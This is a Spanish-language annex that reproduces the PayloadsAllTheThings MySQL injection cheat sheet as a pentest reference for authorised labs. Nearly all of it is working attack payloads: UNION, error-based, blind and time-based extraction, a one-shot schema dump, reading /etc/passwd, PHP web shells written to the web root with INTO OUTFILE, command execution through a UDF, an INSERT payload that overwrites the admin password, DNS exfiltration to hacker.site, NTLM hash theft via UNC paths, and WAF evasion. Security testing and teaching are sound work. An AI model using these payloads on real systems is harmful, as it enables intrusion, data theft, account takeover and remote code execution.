# SQL injection: anexo de ejemplos de PayloadsAllTheThings

> **Uso:** elegir el bloque que corresponde al motor, versión y punto de entrada. Las líneas de un bloque pueden ser alternativas. Sustituir hosts, rutas, identificadores y dominios por los del laboratorio o alcance autorizado. Los ejemplos originales son referencias de sintaxis, no pruebas verificadas contra el objetivo.

**Documento de origen:** [SQL Injection/MySQL Injection.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/SQL%20Injection/MySQL%20Injection.md), revisión fija 3ac27901c711. **Licencia:** [MIT de Swissky](../../LICENCIA_PATT.md).

[← Índice de anexos](Catalogo_PATT.md) · [← Guía principal](README.md)

## 1. Inyección MySQL / MYSQL Comentarios

### Variantes presentes en tablas o texto del apartado

```text
#
/* MYSQL Comment */
/*! MYSQL Special SQL */
/*!32302 10*/
--
;%00
```

## 2. Inyección MySQL / MYSQL Pruebas iniciales de inyección

```ps1
    ' False
    '' True
    " False
    "" True
    \ False
    \\ True
```

```ps1
    AND 1     True
    AND 0     False
    AND true True
    AND false False
    1-false     Returns 1 if vulnerable
    1-true     Returns 0 if vulnerable
    1*56     Returns 56 if vulnerable
    1*56     Returns 1 if not vulnerable
```

```ps1
    ' OR '1
    ' OR 1 -- -
    " OR "" = "
    " OR 1 = 1 -- -
    '='
    'LIKE'
    '=0--+
```

### Variantes presentes en tablas o texto del apartado

```text
SELECT * FROM Table WHERE id = 'FUZZ';
SELECT * FROM Table WHERE id = FUZZ;
SELECT * FROM Users WHERE username = 'FUZZ1' AND password = 'FUZZ2';
```

## 3. Detección del número de columnas / Método iterativo con NULL

```sql
UNION SELECT NULL;--
UNION SELECT NULL, NULL;-- 
UNION SELECT NULL, NULL, NULL;-- 
```

### Variantes presentes en tablas o texto del apartado

```text
UNION SELECT
```

## 4. Detección del número de columnas / Método ORDER BY

```sql
ORDER BY 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100--+ # Unknown column '4' in 'order clause'
```

### Variantes presentes en tablas o texto del apartado

```text
False
GROUP BY
ORDER BY
ORDER BY 1--+
GROUP BY 1--+
ORDER BY 2--+
GROUP BY 2--+
ORDER BY 3--+
GROUP BY 3--+
ORDER BY 4--+
GROUP BY 4--+
ORDER BY 4
UNION
SELECT
-1' UNION SELECT 1,2,3--+
```

## 5. Detección del número de columnas / Método LIMIT INTO

### Variantes presentes en tablas o texto del apartado

```text
1' LIMIT 1,1 INTO @--+
The used SELECT statements have a different number of columns
1' LIMIT 1,1 INTO @,@--+
1' LIMIT 1,1 INTO @,@,@--+
-1' UNION SELECT 1,2,3--+
```

## 6. MYSQL Basada en UNION / Extraer base de datos Con Information_Schema

```sql
UNION SELECT 1,2,3,4,...,GROUP_CONCAT(0x7c,schema_name,0x7c) FROM information_schema.schemata
```

```sql
UNION SELECT 1,2,3,4,...,GROUP_CONCAT(0x7c,table_name,0x7C) FROM information_schema.tables WHERE table_schema=PLACEHOLDER
```

```sql
UNION SELECT 1,2,3,4,...,GROUP_CONCAT(0x7c,column_name,0x7C) FROM information_schema.columns WHERE table_name=...
```

```sql
UNION SELECT 1,2,3,4,...,GROUP_CONCAT(0x7c,data,0x7C) FROM ...
```

## 7. MYSQL Basada en UNION / Extraer nombres de columnas Sin Information_Schema

### Variantes presentes en tablas o texto del apartado

```text
MySQL >= 4.1
(1)and(SELECT * from db.users)=(1)
1 and (1,2,3,4) = (SELECT * from db.users UNION SELECT 1,2,3,4 LIMIT 1)
UNION SELECT * FROM (SELECT * FROM users JOIN users b)a
UNION SELECT * FROM (SELECT * FROM users JOIN users b USING(id))a
UNION SELECT * FROM (SELECT * FROM users JOIN users b USING(id,name))a
```

## 8. MYSQL Basada en UNION / Extraer datos Sin Columnas Name

```sql
SELECT `4` FROM (SELECT 1,2,3,4,5,6 UNION SELECT * FROM USERS)DBNAME;
```

```sql
MariaDB [dummydb]> SELECT AUTHOR_ID,TITLE FROM POSTS WHERE AUTHOR_ID=-1 UNION SELECT 1,(SELECT CONCAT(`3`,0X3A,`4`) FROM (SELECT 1,2,3,4,5,6 UNION SELECT * FROM USERS)A LIMIT 1,1);
+-----------+-----------------------------------------------------------------+
| author_id | title                                                           |
+-----------+-----------------------------------------------------------------+
|         1 | a45d4e080fc185dfa223aea3d0c371b6cc180a37:veronica80@example.org |
+-----------+-----------------------------------------------------------------+
```

### Variantes presentes en tablas o texto del apartado

```text
select author_id,title from posts where author_id=[INJECT_HERE]
```

## 9. Inyección MySQL / MYSQL Basada en errores

### Variantes presentes en tablas o texto del apartado

```text
AND GTID_SUBSET(CONCAT('~',(SELECT version()),'~'),1337) -- -
AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT('~',(SELECT version()),'~')) USING utf8))) -- -
AND EXTRACTVALUE(1337,CONCAT('.','~',(SELECT version()),'~')) -- -
AND UPDATEXML(1337,CONCAT('.','~',(SELECT version()),'~'),31337) -- -
AND EXP(~(SELECT * FROM (SELECT CONCAT('~',(SELECT version()),'~','x'))x)) -- -
OR 1 GROUP BY CONCAT('~',(SELECT version()),'~',FLOOR(RAND(0)*2)) HAVING MIN(0) -- -
AND (SELECT * FROM (SELECT NAME_CONST(version(),1),NAME_CONST(version(),1)) as x)--
AND UUID_TO_BIN(version())='1
```

## 10. MYSQL Basada en errores / MYSQL Basada en errores - Básicos

```sql
(SELECT 1 AND ROW(1,1)>(SELECT COUNT(*),CONCAT(CONCAT(@@VERSION),0X3A,FLOOR(RAND()*2))X FROM (SELECT 1 UNION SELECT 2)A GROUP BY X LIMIT 1))
'+(SELECT 1 AND ROW(1,1)>(SELECT COUNT(*),CONCAT(CONCAT(@@VERSION),0X3A,FLOOR(RAND()*2))X FROM (SELECT 1 UNION SELECT 2)A GROUP BY X LIMIT 1))+'
```

### Variantes presentes en tablas o texto del apartado

```text
MySQL >= 4.1
```

## 11. MYSQL Basada en errores / MYSQL Basada en errores - UpdateXML Function

```sql
AND UPDATEXML(rand(),CONCAT(CHAR(126),version(),CHAR(126)),null)-
AND UPDATEXML(rand(),CONCAT(0x3a,(SELECT CONCAT(CHAR(126),schema_name,CHAR(126)) FROM information_schema.schemata LIMIT data_offset,1)),null)--
AND UPDATEXML(rand(),CONCAT(0x3a,(SELECT CONCAT(CHAR(126),TABLE_NAME,CHAR(126)) FROM information_schema.TABLES WHERE table_schema=data_column LIMIT data_offset,1)),null)--
AND UPDATEXML(rand(),CONCAT(0x3a,(SELECT CONCAT(CHAR(126),column_name,CHAR(126)) FROM information_schema.columns WHERE TABLE_NAME=data_table LIMIT data_offset,1)),null)--
AND UPDATEXML(rand(),CONCAT(0x3a,(SELECT CONCAT(CHAR(126),data_info,CHAR(126)) FROM data_table.data_column LIMIT data_offset,1)),null)--
```

```sql
UPDATEXML(null,CONCAT(0x0a,version()),null)-- -
UPDATEXML(null,CONCAT(0x0a,(select table_name from information_schema.tables where table_schema=database() LIMIT 0,1)),null)-- -
```

## 12. MYSQL Basada en errores / MYSQL Basada en errores - Extractvalue Function

```sql
?id=1 AND EXTRACTVALUE(RAND(),CONCAT(CHAR(126),VERSION(),CHAR(126)))--
?id=1 AND EXTRACTVALUE(RAND(),CONCAT(0X3A,(SELECT CONCAT(CHAR(126),schema_name,CHAR(126)) FROM information_schema.schemata LIMIT data_offset,1)))--
?id=1 AND EXTRACTVALUE(RAND(),CONCAT(0X3A,(SELECT CONCAT(CHAR(126),table_name,CHAR(126)) FROM information_schema.TABLES WHERE table_schema=data_column LIMIT data_offset,1)))--
?id=1 AND EXTRACTVALUE(RAND(),CONCAT(0X3A,(SELECT CONCAT(CHAR(126),column_name,CHAR(126)) FROM information_schema.columns WHERE TABLE_NAME=data_table LIMIT data_offset,1)))--
?id=1 AND EXTRACTVALUE(RAND(),CONCAT(0X3A,(SELECT CONCAT(CHAR(126),data_column,CHAR(126)) FROM data_schema.data_table LIMIT data_offset,1)))--
```

### Variantes presentes en tablas o texto del apartado

```text
MySQL >= 5.1
```

## 13. MYSQL Basada en errores / MYSQL Basada en errores - NAME_CONST function (only for constants)

```sql
?id=1 AND (SELECT * FROM (SELECT NAME_CONST(version(),1),NAME_CONST(version(),1)) as x)--
?id=1 AND (SELECT * FROM (SELECT NAME_CONST(user(),1),NAME_CONST(user(),1)) as x)--
?id=1 AND (SELECT * FROM (SELECT NAME_CONST(database(),1),NAME_CONST(database(),1)) as x)--
```

### Variantes presentes en tablas o texto del apartado

```text
MySQL >= 5.0
```

## 14. MYSQL Ciega / MYSQL Ciega Con Substring Equivalent

```sql
?id=1 AND SELECT SUBSTR(table_name,1,1) FROM information_schema.tables > 'A'
?id=1 AND SELECT SUBSTR(column_name,1,1) FROM information_schema.columns > 'A'
?id=1 AND ASCII(LOWER(SUBSTR(version(),1,1)))=51
```

### Variantes presentes en tablas o texto del apartado

```text
SUBSTR(version(),1,1)=5
SUBSTRING(version(),1,1)=5
RIGHT(left(version(),1),1)=5
MID(version(),1,1)=4
LEFT(version(),1)=4
```

## 15. MYSQL Ciega / MYSQL Ciega Usando a Conditional Statement

```sql
    2100935' OR IF(MID(@@version,1,1)='5',sleep(1),1)='2
    Response:
    HTTP/1.1 500 Internal Server Error
```

```sql
    2100935' OR IF(MID(@@version,1,1)='4',sleep(1),1)='2
    Response:
    HTTP/1.1 200 OK
```

### Variantes presentes en tablas o texto del apartado

```text
if @@version starts with a 5
if @@version starts with a 4
```

## 16. MYSQL Ciega / MYSQL Ciega Con MAKE_SET

```sql
AND MAKE_SET(VALUE_TO_EXTRACT<(SELECT(length(version()))),1)
AND MAKE_SET(VALUE_TO_EXTRACT<ascii(substring(version(),POS,1)),1)
AND MAKE_SET(VALUE_TO_EXTRACT<(SELECT(length(concat(login,password)))),1)
AND MAKE_SET(VALUE_TO_EXTRACT<ascii(substring(concat(login,password),POS,1)),1)
```

## 17. MYSQL Ciega / MYSQL Ciega Con LIKE

```sql
SELECT cust_code FROM customer WHERE cust_name LIKE 'k__l';
SELECT * FROM products WHERE product_name LIKE '%user_input%'
```

### Variantes presentes en tablas o texto del apartado

```text
%
_
```

## 18. MYSQL Ciega / MySQL Ciega Con REGEXP

### Variantes presentes en tablas o texto del apartado

```text
' OR (SELECT username FROM users WHERE username REGEXP '^.{8,}$') --
' OR (SELECT username FROM users WHERE username REGEXP '[0-9]') --
' OR (SELECT username FROM users WHERE username REGEXP '^a[a-z]') --
```

## 19. Inyección MySQL / MYSQL Basada en tiempo

```sql
    +BENCHMARK(40000000,SHA1(1337))+
    '+BENCHMARK(3200,SHA1(1))+'
    AND [RANDNUM]=BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]'))
```

```sql
    RLIKE SLEEP([SLEEPTIME])
    OR ELT([RANDNUM]=[RANDNUM],SLEEP([SLEEPTIME]))
    XOR(IF(NOW()=SYSDATE(),SLEEP(5),0))XOR
    AND SLEEP(10)=0
    AND (SELECT 1337 FROM (SELECT(SLEEP(10-(IF((1=1),0,10))))) RANDSTR)
```

### Variantes presentes en tablas o texto del apartado

```text
BENCHMARK()
SLEEP()
```

## 20. MYSQL Basada en tiempo / Usando SLEEP in a Subselect

```sql
1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE '%')#
1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE '___')# 
1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE '____')#
1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE '_____')#
```

```sql
1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE 'A____')#
1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE 'S____')#
```

```sql
1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE 'SA___')#
1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE 'SW___')#
```

```sql
1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE 'SWA__')#
1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE 'SWB__')#
1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE 'SWI__')#
```

```sql
1 AND (SELECT SLEEP(10) FROM DUAL WHERE (SELECT table_name FROM information_schema.columns WHERE table_schema=DATABASE() AND column_name LIKE '%pass%' LIMIT 0,1) LIKE '%')#
```

## 21. MYSQL Basada en tiempo / Usando Conditional Statements

```sql
?id=1 AND IF(ASCII(SUBSTRING((SELECT USER()),1,1))>=100,1, BENCHMARK(2000000,MD5(NOW()))) --
?id=1 AND IF(ASCII(SUBSTRING((SELECT USER()), 1, 1))>=100, 1, SLEEP(3)) --
?id=1 OR IF(MID(@@version,1,1)='5',sleep(1),1)='2
```

## 22. Inyección MySQL / MYSQL DIOS - Dump in One Shot

```sql
(select (@) from (select(@:=0x00),(select (@) from (information_schema.columns) where (table_schema>=@) and (@)in (@:=concat(@,0x0D,0x0A,' [ ',table_schema,' ] > ',table_name,' > ',column_name,0x7C))))a)#
(select (@) from (select(@:=0x00),(select (@) from (db_data.table_data) where (@)in (@:=concat(@,0x0D,0x0A,0x7C,' [ ',column_data1,' ] > ',column_data2,' > ',0x7C))))a)#
```

```sql
    make_set(6,@:=0x0a,(select(1)from(information_schema.columns)where@:=make_set(511,@,0x3c6c693e,table_name,column_name)),@)
```

```sql
    (select(@)from(select(@:=0x00),(select(@)from(information_schema.columns)where(@)in(@:=concat(@,0x3C62723E,table_name,0x3a,column_name))))a)
```

```sql
    (select(select concat(@:=0xa7,(select count(*)from(information_schema.columns)where(@:=concat(@,0x3c6c693e,table_name,0x3a,column_name))),@))
```

```sql
    (Select export_set(5,@:=0,(select count(*)from(information_schema.columns)where@:=export_set(5,export_set(5,@,table_name,0x3c6c693e,2),column_name,0xa3a,2)),@,2))
```

```sql
    +make_set(6,@:=0x0a,(select(1)from(information_schema.columns)where@:=make_set(511,@,0x3c6c693e,table_name,column_name)),@)
```

```sql
    (select(@a)from(select(@a:=0x00),(select(@a)from(information_schema.columns)where(table_schema!=0x696e666f726d6174696f6e5f736368656d61)and(@a)in(@a:=concat(@a,table_name,0x203a3a20,column_name,0x3c62723e))))a)
```

## 23. Inyección MySQL / MYSQL Actual Consultas

```sql
SELECT * FROM INFORMATION_SCHEMA.PROCESSLIST;
```

```sql
UNION SELECT 1,state,info,4 FROM INFORMATION_SCHEMA.PROCESSLIST #
```

```sql
UNION SELECT 1,(SELECT(@)FROM(SELECT(@:=0X00),(SELECT(@)FROM(information_schema.processlist)WHERE(@)IN(@:=CONCAT(@,0x3C62723E,state,0x3a,info))))a),3,4 #
```

### Variantes presentes en tablas o texto del apartado

```text
INFORMATION_SCHEMA.PROCESSLIST
```

## 24. Inyección MySQL / MYSQL Lectura de un archivo

```sql
UNION ALL SELECT LOAD_FILE('/etc/passwd') --
UNION ALL SELECT TO_base64(LOAD_FILE('/var/www/html/index.php'));
```

```sql
GRANT FILE ON *.* TO 'root'@'localhost'; FLUSH PRIVILEGES;#
```

### Variantes presentes en tablas o texto del apartado

```text
ERROR 1290 (HY000): The MySQL server is running with the --secure-file-priv option so it cannot execute this statement
LOAD_FILE
```

## 25. MYSQL Ejecución de comandos / WEBSHELL - OUTFILE Método

```sql
[...] UNION SELECT "<?php system($_GET['cmd']); ?>" into outfile "C:\\xampp\\htdocs\\backdoor.php"
[...] UNION SELECT '' INTO OUTFILE '/var/www/html/x.php' FIELDS TERMINATED BY '<?php phpinfo();?>'
[...] UNION SELECT 1,2,3,4,5,0x3c3f70687020706870696e666f28293b203f3e into outfile 'C:\\wamp\\www\\pwnd.php'-- -
[...] union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6 into OUTFILE 'c:/inetpub/wwwroot/backdoor.php'
```

## 26. MYSQL Ejecución de comandos / WEBSHELL - DUMPFILE Método

```sql
[...] UNION SELECT 0xPHP_PAYLOAD_IN_HEX, NULL, NULL INTO DUMPFILE 'C:/Program Files/EasyPHP-12.1/www/shell.php'
[...] UNION SELECT 0x3c3f7068702073797374656d28245f4745545b2763275d293b203f3e INTO DUMPFILE '/var/www/html/images/shell.php';
```

## 27. MYSQL Ejecución de comandos / COMMAND - UDF Library

```powershell
$ whereis lib_mysqludf_sys.so
/usr/lib/lib_mysqludf_sys.so
```

```sql
$ mysql -u root -p mysql
Enter password: [...]

mysql> SELECT sys_eval('id');
+--------------------------------------------------+
| sys_eval('id') |
+--------------------------------------------------+
| uid=118(mysql) gid=128(mysql) groups=128(mysql) |
+--------------------------------------------------+
```

### Variantes presentes en tablas o texto del apartado

```text
sys_exec
sys_eval
```

## 28. Inyección MySQL / MYSQL INSERT

```sql
attacker_dummy@example.com", "P@ssw0rd"), ("admin@example.com", "P@ssw0rd") ON DUPLICATE KEY UPDATE password="P@ssw0rd" --
```

```sql
INSERT INTO users (email, password) VALUES ("attacker_dummy@example.com", "BCRYPT_HASH"), ("admin@example.com", "P@ssw0rd") ON DUPLICATE KEY UPDATE password="P@ssw0rd" -- ", "BCRYPT_HASH_OF_YOUR_PASSWORD_INPUT");
```

### Variantes presentes en tablas o texto del apartado

```text
attacker_dummy@example.com
admin@example.com
```

## 29. Inyección MySQL / MYSQL Truncation

```sql
`username` varchar(20) not null
```

### Variantes presentes en tablas o texto del apartado

```text
username = "admin               a"
```

## 30. Inyección MySQL / MYSQL Fuera de banda

```powershell
SELECT @@version INTO OUTFILE '\\\\192.168.0.100\\temp\\out.txt';
SELECT @@version INTO DUMPFILE '\\\\192.168.0.100\\temp\\out.txt;
```

## 31. MYSQL Fuera de banda / DNS Extracción de datos

```sql
SELECT LOAD_FILE(CONCAT('\\\\',VERSION(),'.hacker.site\\a.txt'));
SELECT LOAD_FILE(CONCAT(0x5c5c5c5c,VERSION(),0x2e6861636b65722e736974655c5c612e747874))
```

## 32. MYSQL Fuera de banda / UNC Path - NTLM Hash Stealing

```sql
SELECT LOAD_FILE('\\\\error\\abc');
SELECT LOAD_FILE(0x5c5c5c5c6572726f725c5c616263);
SELECT '' INTO DUMPFILE '\\\\error\\abc';
SELECT '' INTO OUTFILE '\\\\error\\abc';
LOAD DATA INFILE '\\\\error\\abc' INTO TABLE DATABASE.TABLE_NAME;
```

### Variantes presentes en tablas o texto del apartado

```text
\\server\share\file
```

## 33. MYSQL Evasión de WAF / Alternativa to Información Schema

```sql
SELECT * FROM mysql.innodb_table_stats;
+----------------+-----------------------+---------------------+--------+----------------------+--------------------------+
| database_name  | table_name            | last_update         | n_rows | clustered_index_size | sum_of_other_index_sizes |
+----------------+-----------------------+---------------------+--------+----------------------+--------------------------+
| dvwa           | guestbook             | 2017-01-19 21:02:57 |      0 |                    1 |                        0 |
| dvwa           | users                 | 2017-01-19 21:03:07 |      5 |                    1 |                        0 |
...
+----------------+-----------------------+---------------------+--------+----------------------+--------------------------+

mysql> SHOW TABLES IN dvwa;
+----------------+
| Tables_in_dvwa |
+----------------+
| guestbook      |
| users          |
+----------------+
```

### Variantes presentes en tablas o texto del apartado

```text
information_schema.tables
```

## 34. MYSQL Evasión de WAF / Alternativa to VERSION

```sql
mysql> SELECT @@innodb_version;
+------------------+
| @@innodb_version |
+------------------+
| 5.6.31           |
+------------------+

mysql> SELECT @@version;
+-------------------------+
| @@version               |
+-------------------------+
| 5.6.31-0ubuntu0.15.10.1 |
+-------------------------+

mysql> SELECT version();
+-------------------------+
| version()               |
+-------------------------+
| 5.6.31-0ubuntu0.15.10.1 |
+-------------------------+

mysql> SELECT @@GLOBAL.VERSION;
+------------------+
| @@GLOBAL.VERSION |
+------------------+
| 8.0.27           |
+------------------+
```

## 35. MYSQL Evasión de WAF / Alternativa to GROUP_CONCAT

```sql
SELECT json_arrayagg(concat_ws(0x3a,table_schema,table_name)) from INFORMATION_SCHEMA.TABLES;
```

### Variantes presentes en tablas o texto del apartado

```text
MySQL >= 5.7.22
json_arrayagg()
group_concat()
```

## 36. MYSQL Evasión de WAF / Scientific Notation

### Variantes presentes en tablas o texto del apartado

```text
base 'e' exponent
1 x 10^3
1000
1.5e3
1.5 x 10^3
1500
2e-3
2 x 10^-3
0.002
SELECT table_name FROM information_schema 1.e.tables
SELECT table_name FROM information_schema .tables
' or ''='
' or 1.e('')='
1' or 1.e(1) or '1'='1
1.e(ascii 1.e(substring(1.e(select password from users limit 1 1.e,1 1.e) 1.e,1 1.e,1 1.e)1.e)1.e) = 70 or'1'='2
```

## 37. MYSQL Evasión de WAF / Conditional Comentarios

### Variantes presentes en tablas o texto del apartado

```text
/*! ... */
/*!
/*!12345UNION*/
/*!31337SELECT*/
```

## 38. MYSQL Evasión de WAF / Wide Byte Inyección (GBK)

```sql
%A8%27 OR 1=1;--
%8C%A8%27 OR 1=1--
%bf' OR 1=1 -- --
```

```php
function check_addslashes($string)
{
    $string = preg_replace('/'. preg_quote('\\') .'/', "\\\\\\", $string);          //escape any backslash
    $string = preg_replace('/\'/i', '\\\'', $string);                               //escape single quote with a backslash
    $string = preg_replace('/\"/', "\\\"", $string);                                //escape double quote with a backslash
      
    return $string;
}

$id=check_addslashes($_GET['id']);
mysql_query("SET NAMES gbk");
$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
print_r(mysql_error());
```

### Variantes presentes en tablas o texto del apartado

```text
%bf%27
0xbf27
%bf%5c
0xbf5c
\
%a1%27
0xa127
'
?id=1'
SELECT * FROM users WHERE id='1\'' LIMIT 0,1
%df
?id=1%df'
SELECT * FROM users WHERE id='1%df\'' LIMIT 0,1
%df%5c
SELECT * FROM users WHERE id='1連'' LIMIT 0,1
?id=1%df' and 1=1 --+
SELECT * FROM users WHERE id='1連' and 1=1 --+' LIMIT 0,1
```

---

[← Índice de anexos](Catalogo_PATT.md) · [← Guía principal](README.md) · [Licencia de origen](../../LICENCIA_PATT.md)
